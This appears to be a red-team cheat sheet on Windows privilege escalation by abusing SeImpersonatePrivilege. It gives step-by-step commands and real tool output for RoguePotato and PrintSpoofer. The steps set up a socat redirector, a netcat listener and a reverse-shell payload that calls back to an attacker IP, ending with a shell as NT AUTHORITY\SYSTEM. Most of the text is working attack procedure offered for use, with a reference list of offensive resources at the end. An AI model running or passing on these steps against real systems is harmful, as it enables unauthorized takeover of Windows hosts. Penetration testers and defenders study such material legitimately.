# Living off the Land

## 01 - Detect

Check if `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled.

```
C:\Windows\System32> whoami
win-qba94kb3iof\admin

C:\Windows\System32> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
..[omitted]..
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
..[omitted]..
```

## 02 - Exploit

### 2.1 - RoguePotato

Start with a redirector using `socat`.

```
$ sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_IP>:9999

C:\Windows\System32> whoami
win-qba94kb3iof\admin

C:\Windows\System32> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
..[omitted]..
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
..[omitted]..
```

Start a shell handler before running `PsExec64.exe` as in `NT AUTHORITY\LOCAL SERVICE` to receive a callback shell.

```
C:\Windows\System32> cd c:\Tools

C:\Tools> PsExec64.exe -i -u "nt authority\local service" c:\Tools\shell.exe

$ sudo nc -lnvp 53
C:\Windows\System32> whoami
nt authority\local service

C:\Windows\System32> cd c:\Tools

C:\Tools> RoguePotato.exe -r <attacker_IP> -e shell.exe -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] IStoragetrigger written:106 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: shell.exe
[+] RoguePotato gave you the SYSTEM powerz :D

$ sudo nc -lnvp 53
C:\Tools> whoami
nt authority\system
```

### 2.2 - PrintSpoofer

```
C:\Tools> PsExec64.exe -i -u "nt authority\local service" c:\Tools\shell.exe

$ sudo nc -lnvp 53
C:\Windows\System32> whoami
nt authority\local service

C:\Windows\System32> whoami /priv

C:\Windows\System32> cd c:\Tools

C:\Tools> PrintSpoofer.exe -c shell.exe -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

$ sudo nc -lnvp 53
C:\Windows\System32> whoami
nt authority\system
```

---
## References

### Github

- [gtworek: Priv2Admin](https://github.com/gtworek/Priv2Admin)

- [itm4n: PrinterSpoofer](https://github.com/itm4n/PrintSpoofer)

- [lypd0: DeadPotato](https://github.com/lypd0/DeadPotato)

- [breenmachine: RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

### Hacktricks

- [Hacktricks: RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)

- [Hacktricks: Abusing Tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

### Hacking Articles

- [Hacking Articles: Windows Privilege Escalation SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)

### itm4n

- [itm4n: PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

### Juggernaut-Sec

- [Juggernaut-Sec: SeImpersonatePrivilege â€“ Windows Privilege Escalation](https://juggernaut-sec.com/seimpersonateprivilege/)

### ohpe

- [ohpe: Juicy Potato CLSID Enumeration](https://ohpe.it/juicy-potato/CLSID/)

### Jlajara

- [Jlajara: Potatoes Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)